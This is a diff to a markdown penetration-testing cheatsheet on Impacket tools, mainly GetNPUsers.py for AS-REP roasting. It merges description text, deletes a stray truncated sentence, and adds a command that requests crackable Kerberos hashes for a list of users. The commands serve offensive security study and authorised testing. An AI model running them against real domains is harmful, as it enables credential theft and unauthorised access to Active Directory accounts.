@@ -48,13 +48,11 @@ dcomexec.py $domain/$username:$password@$IP <command>
 Password Encryption tool on Windows
 
 ## GetNPUsers.py
-For users that do not require Kerberos preauthentiation: 
-'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH). 
-Output is compatible with JtR:[[John-The-Ripper-Cheatsheet]] use `-format hashcat` for  hashcat:[[Hashcat-Cheatsheet]] 
-order to get access to the dc01 machine, we need to perform a lateral movement attack that we l
+ASREP Roasting - For users that do not require Kerberos preauthentiation: 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR:[[John-The-Ripper-Cheatsheet]] use `-format hashcat` for  hashcat: [[Hashcat-Cheatsheet]].
 ```bash
 GetNPUsers.py  -dc-ip $IP -request '$domain/' 
 GetNPUsers.py  -dc-ip $IP -request '$domain/' -format hashcat
+GetNPUsers.py  -dc-ip DC -usersfile users.txt -format john domain.tld
 ```
 This example will attempt to list and get TGTs for those users that have the property:
 ```bash
@@ -67,6 +65,8 @@ This example will attempt to list and get TGTs for those users that have the pro
 # Request TGTs for users in a file
 → GetNPUsers.py $domain/ -no-pass -usersfile users.txt
 ```
+
+
 
 ## GetTGT.py
 Given a password, hash or aesKey, this script will request a TGT and save it as ccache.
